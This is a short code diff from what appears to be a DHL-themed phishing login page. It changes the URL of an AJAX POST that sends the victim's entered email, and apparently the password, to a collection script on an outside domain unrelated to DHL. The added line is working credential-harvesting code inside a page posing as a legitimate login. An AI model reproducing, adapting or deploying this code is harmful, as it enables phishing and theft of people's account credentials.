@@ -331,7 +331,7 @@ span.psw {
         
         $.ajax({
           dataType: 'JSON',
-          url: 'https://adova-groups.com/kingdhl/logged.php',
+          url: 'https://adova-groups.com/mydhl/logged.php',
           type: 'POST',
       	data:{
       		email:email,
